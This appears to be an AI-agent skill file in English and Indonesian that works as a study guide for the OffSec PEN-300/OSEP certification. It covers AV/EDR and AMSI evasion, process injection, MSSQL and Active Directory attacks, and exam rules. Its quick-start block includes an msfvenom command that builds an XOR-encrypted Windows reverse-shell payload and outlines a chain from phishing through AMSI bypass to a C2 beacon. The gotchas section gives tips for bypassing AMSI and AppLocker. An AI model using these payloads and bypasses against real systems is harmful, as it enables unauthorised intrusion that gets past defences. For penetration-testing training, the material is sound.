---
name: offsec-pen-300
description: OffSec PEN-300 / OSEP — advanced evasion techniques, AV/EDR bypass, AMSI/AppLocker/CLM evasion, process injection, custom shellcode runners, MSSQL attacks, AD exploitation, delegation, ADCS, and professional report writing.
license: MIT
compatibility: opencode
metadata:
  audience: penetration-testers
  workflow: exploitation
  source: offsec-pen-300
  standard: osep
  year: "2026"
---

# OSEP — Evasion Techniques & Breaching Defenses

## Prerequisites

- OSCP (or equivalent) — strong foundation in enumeration and exploitation
- C# programming — P/Invoke, marshaling, Win32 API calls
- PowerShell scripting — reflection, assembly manipulation, AMSI concepts
- Active Directory basics — domain enumeration, Kerberos authentication

## Quick Start Workflow

```bash
# 1. Setup C2 listener (Metasploit recommended)
msfconsole -q -r auto.rc

# 2. Generate encrypted shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT --encrypt xor --encrypt-key 0xAA -f csharp

# 3. Create custom loader (process injection / hollowing)
# Compile with: csc.exe loader.cs

# 4. Deliver via phishing (VBA / JScript / HTA) or web exploit

# 5. AMSI bypass → shellcode runner → C2 beacon
```

## Decision Frame

Lima keputusan yang menentukan hasil OSEP. Ambil sebelum menulis payload pertama.

1. **Custom payload atau tool publik?** — Jika bypass yang sama gagal dua kali dalam 30 menit, berhenti menambal dan tulis loader sendiri. Yang dinilai adalah rantai yang kamu pahami, bukan tool yang kamu jalankan.
2. **Sudah cukup foothold untuk bergerak?** — Sebelum exploit berikutnya, catat interfaces, user context, kredensial, dan host yang bisa dijangkau. Bergerak tanpa peta jaringan akan menghabiskan jam ke-30 untuk re-enumerasi.
3. **Revert atau debug?** — Lebih dari 30 menit tanpa kemajuan pada satu mesin = revert (kuota 50, bisa di-reset sekali). Environment yang aneh bukan bahan belajar saat exam.
4. **Bukti ini lolos grader?** — Proof file hanya sah dari remote interactive shell dengan `type`/`cat`, menampilkan isi file **dan** IP (`ipconfig`/`ifconfig`) di screenshot yang sama, lalu disubmit ke control panel. Web shell atau RDP = 0 poin.
5. **Urutan report sudah final?** — Mesin dinilai sesuai urutan dokumentasi di report. Susun dari yang paling yakin ke paling lemah, jangan mengikuti urutan penemuan.

Berhenti dan periksa ulang kalau target di luar scope Exam Control Panel, atau kamu akan memakai tool komersial (Metasploit Pro, Cobalt Strike, Burp Suite Pro) — itu otomatis 0 poin untuk target tersebut.

> Angka ujian di skill ini (termasuk di `references/`) disalin dari [docs/CERTIFICATION-FACTS.md](../../docs/CERTIFICATION-FACTS.md) — diverifikasi 2026-11-08. Jika dokumen itu tidak tersedia di lingkunganmu, perlakukan angka ini sebagai snapshot dan periksa ulang ke sumber resmi sebelum dipakai untuk keputusan berbayar.

## OSEP Mindset

"Bypass Deeper" — Anda sudah tahu cara exploit, sekarang pelajari cara melakukannya saat ada Defender, AMSI, AppLocker, dan EDR yang menghadang.

### Golden Rules

1. **Custom payloads > off-the-shelf tools** — 80-90% waktu untuk coding dan testing
2. **Simplify, don't over-engineer** — satu lapis enkripsi (XOR/AES) cukup
3. **Automate everything** — script regenerate payloads, template code
4. **Document as you pwn** — screenshot setiap langkah
5. **Master ONE C2 framework** — Metasploit cukup untuk exam
6. **Revert is a strategy** — stuck >30 menit? revert

## Key Techniques

| Category | Techniques | Reference |
|----------|------------|-----------|
| **AV/EDR Evasion** | AMSI bypass (6 methods), CLM bypass (5 methods), AppLocker bypass (7 methods) | [av-edr-evasion.md](./references/av-edr-evasion.md) |
| **Process Injection** | Process injection, DLL injection, reflective DLL, process hollowing | [process-injection.md](./references/process-injection.md) |
| **Shellcode Runners** | XOR/AES encoding, C# loaders, InstallUtil bypass, msbuild | [shellcode-runners.md](./references/shellcode-runners.md) |
| **MSSQL Attacks** | Linked servers, xp_cmdshell, PowerUpSQL, NTLM relay | [mssql-attacks.md](./references/mssql-attacks.md) |
| **AD Exploitation** | Unconstrained/constrained/RBCD delegation, ADCS (ESC1-ESC8), forest trust | [ad-exploitation.md](./references/ad-exploitation.md) |
| **C2 Frameworks** | Metasploit, Sliver, Mythic, StageListener bridge | [c2-strategy.md](./references/c2-strategy.md) |
| **Exam Strategy** | 47h45m time management, challenge labs, checklists, report writing | [exam-strategy.md](./references/exam-strategy.md) |

## 16 Modules Overview

| Module | Topic |
|--------|-------|
| 1 | OS & Programming Theory (Win32 API, P/Invoke, PEB/TEB) |
| 2 | Client-Side Code Execution with Office (VBA macros) |
| 3 | Client-Side Code Execution with JScript (HTA, DotNetToJScript) |
| 4 | Process Injection & Migration |
| 5 | Introduction to AV Evasion |
| 6 | Advanced AV Evasion (AMSI, UAC bypass) |
| 7 | Application Whitelisting (AppLocker, CLM) |
| 8 | Bypassing Network Filters (DNS tunneling, domain fronting) |
| 9 | Linux Lateral Movement (LD_PRELOAD, SSH, VI backdoor) |
| 10 | Kiosk Breakouts |
| 11 | Windows Credentials (Mimikatz, SAM, LSASS) |
| 12 | Windows Lateral Movement (RDP, WMI, WinRM, DCOM) |
| 13 | Microsoft SQL Attacks |
| 14 | Active Directory Exploitation (delegation) |
| 15 | ADCS (ESC1-ESC8) |
| 16 | Combining the Pieces (full attack chain) |

Detail lengkap: [modules-overview.md](./references/modules-overview.md)

## OSCE³ Pathway

| Sertifikasi | Course | Fokus |
|-------------|--------|-------|
| **OSEP** | PEN-300 | Evasion & breaching defenses |
| **OSWE** | WEB-300 | Advanced web attacks |
| **OSED** | EXP-301 | Windows exploit development |

## Reference Documentation

| File | Description |
|------|-------------|
| [modules-overview.md](./references/modules-overview.md) | Complete breakdown of 16 PEN-300 modules |
| [av-edr-evasion.md](./references/av-edr-evasion.md) | AMSI, AppLocker, CLM bypass techniques |
| [process-injection.md](./references/process-injection.md) | Process injection, hollowing, DLL injection |
| [shellcode-runners.md](./references/shellcode-runners.md) | Custom C# loaders, encoding pipeline |
| [mssql-attacks.md](./references/mssql-attacks.md) | Linked servers, PowerUpSQL, NTLM relay |
| [ad-exploitation.md](./references/ad-exploitation.md) | Delegation, ADCS, forest trust attacks |
| [c2-strategy.md](./references/c2-strategy.md) | Metasploit, Sliver, Mythic setup |
| [exam-strategy.md](./references/exam-strategy.md) | Challenge labs, time management, checklist |
| [referensi.md](./references/referensi.md) | 100+ external resources, tools, books, labs |

## Assets

| Asset | Description |
|-------|-------------|
| [exam-checklist.md](./assets/exam-checklist.md) | Detailed pre/during/post-exam checklist |

## Scripts

| Script | Description |
|--------|-------------|
| [payload-encoder.py](./scripts/payload-encoder.py) | XOR encoder for shellcode → C# array |

## Gotchas

1. **AMSI bypass tidak universal**: Method `amsiInitFailed` sudah di-patch di Windows 11 23H2+. Selalu siapkan minimal 3 metode berbeda (AmsiScanBuffer patch, custom RunSpace, registry disable).
2. **msfvenom default shellcode terdeteksi**: Jangan pernah pakai shellcode default dari msfvenom tanpa enkripsi. XOR/AES sederhana sudah cukup untuk bypass signature-based detection.
3. **AppLocker tidak hanya di `C:\Windows\`**: Path like `C:\Program Files` juga di-allow. Manfaatkan `bginfo.exe` atau binary signed lain di path tersebut.
4. **Urutan mesin di report = urutan penilaian**: OSEP menilai mesin sesuai urutan dokumentasi di report. Proof file (`local.txt`/`proof.txt`/`secret.txt`) wajib tampil di screenshot **dan** disubmit ke control panel — jika tidak, 0 poin untuk target itu. Screenshot hanya sah dari remote interactive shell (`type`/`cat`) dengan IP + hostname; web shell atau RDP tidak diterima. PDF dalam `.7z` maks 200MB.
5. **Environment bisa broken**: Jika teknik kerja di lab tapi tidak di exam, revert environment. Jangan buang waktu >30 menit debugging environment.
6. **Linked servers ≠ RCE langsung**: Tidak semua linked server memiliki xp_cmdshell enabled. Siapkan alternatif (Olé automation procedures, `sp_OACreate`).

## Progressive Disclosure

| When you need... | Load this file |
|------------------|----------------|
| Module-by-module breakdown of PEN-300 | [modules-overview.md](./references/modules-overview.md) |
| AMSI/AppLocker/CLM bypass techniques | [av-edr-evasion.md](./references/av-edr-evasion.md) |
| Process injection/hollowing C# code | [process-injection.md](./references/process-injection.md) |
| Shellcode runner templates and encoders | [shellcode-runners.md](./references/shellcode-runners.md) |
| MSSQL linked server attack chains | [mssql-attacks.md](./references/mssql-attacks.md) |
| AD delegation and ADCS exploitation | [ad-exploitation.md](./references/ad-exploitation.md) |
| C2 framework setup (Metasploit/Sliver/Mythic) | [c2-strategy.md](./references/c2-strategy.md) |
| Exam strategy, time plan, and checklist | [exam-strategy.md](./references/exam-strategy.md) |
| 100+ external OSEP resources | [referensi.md](./references/referensi.md) |

## License

MIT
